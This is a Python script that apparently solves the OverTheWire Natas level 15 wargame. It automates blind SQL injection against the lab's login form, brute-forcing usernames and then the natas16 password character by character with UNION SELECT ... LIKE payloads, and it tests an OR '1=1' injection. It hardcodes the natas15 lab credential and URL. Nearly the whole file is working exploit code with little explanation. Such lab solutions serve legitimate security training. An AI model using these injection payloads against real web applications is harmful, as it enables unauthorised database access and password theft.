import requests

# Fill in your details here to be posted to the login form.


#Function to stablish connection
def start_session(username,password,url):
    session = requests.Session()
    r = session.post(url,auth=(username, password))
    return session


#This function find the first initial character of the usernames stored in the database
def get_start_char(characters):
    start_char = []
    for char in characters:
        print(f"trying with {char}")
        payload = {'username': "\" UNION SELECT * from users WHERE username LIKE \""+char+"%" }
        r= session.post(url,auth=(username, password),data=payload)
        if b"This user exist" in r.content:
            print(f"we found the following character {char}")
            start_char.append(char)
    return start_char
              
#Function to obtain the usernames stored in the database
def obtain_usernames(username,password,session,url):
    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
    contador = 0
    #['ñ','a', 'c', 'b', 'n', 'Ñ', 'A', 'C', 'B', 'N']
    start_users = get_start_char(characters)
    full_name = []
    for user_to_find in start_users:
        while True:
            if contador == len(characters)-1:
                full_name.append(user_to_find)
                contador=0
                break
            print(f"trying with {user_to_find}{characters[contador]}")
            test = user_to_find+ characters[contador]
            payload = {'username': "\" UNION SELECT * from users WHERE username LIKE \""+test+"%" }
            r= session.post(url,auth=(username, password),data=payload)
            if b"This user exist" in r.content:
                print(f"We've got a match with {characters[contador]}")
                user_to_find +=characters[contador]
                contador=0
            contador+=1
    print(f"The users are \n: {full_name}")
    return full_name

#Function to obtain the password of an user_in_db
def obtain_password(username,password,session,url,user_in_db):
    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
    contador = 0
    newpassword = ''
    while True:
        if contador == len(characters)-1:
            break
        print(f"trying with {newpassword}{characters[contador]}")
        test = newpassword+ characters[contador]
        payload = {'username': f"\" UNION SELECT * FROM users WHERE BINARY password LIKE \"{test}%\" AND username = \"{user_in_db}"}
        r= session.post(url,auth=(username, password),data=payload)
        if b"This user exist" in r.content:
            print(f"We've got a match with {characters[contador]}")
            print(r.content)
            newpassword +=characters[contador]
            contador=0
            continue
        contador+=1
    print(f"the password is {newpassword}")

#Function to see if we can inject code
def test_code_injection():
    payload = {'debug':'True','username': "\" OR \"1=1" }
    r= session.post(url,auth=(username, password),data=payload)
    print(f"this is the content {r.content}")
    if b"This user exist" in r.content:
        print(f"look we injected code!")
    

if __name__ == "__main__" :
    username = "natas15"
    password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
    url = "http://natas15.natas.labs.overthewire.org/index.php?debug=true"
    #put this because, sometimes I dont want to run obtain_usernames :p ['ñatas16', 'alice', 'charlie', 'bob', 'natas16', 'Ñatas16', 'Alice', 'Charlie', 'Bob', 'Natas16']
    session = start_session(username,password,url)
    names = obtain_usernames(username,password,session,url)
    index = names.index("natas16")
    user_wanted = names[index]
    obtain_password(username,password,session,url,user_wanted)
